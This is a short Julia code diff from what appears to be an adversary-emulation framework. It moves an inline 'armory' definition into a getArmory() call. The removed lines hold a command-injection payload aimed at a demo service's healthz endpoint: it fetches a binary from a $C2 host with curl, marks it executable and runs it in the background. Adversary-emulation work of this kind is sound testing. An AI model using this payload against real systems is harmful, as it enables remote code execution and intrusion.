@@ -8,21 +8,7 @@ end
 function onClientConnected(ev::ClientConnected)
     # send armory
     # send current topology
-    println("####   Client connected")
-
-    armory = [
-        TTP(
-            name="Exploit Envoy Proxy CMD injection",
-            id="test",
-            tactics=[string(InitialAccess)],
-            technique=string(ExploitPublicFacingApp),
-            params=ExploitParams(
-                endpoint="http://unguard.kube/healthz",
-                params=Dict("path" => raw"127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &"),
-                method="GET",
-            )
-        )
-    ]
+    armory = getArmory()
     topology = Dict(
         "entities" => [],
         "relations" => []
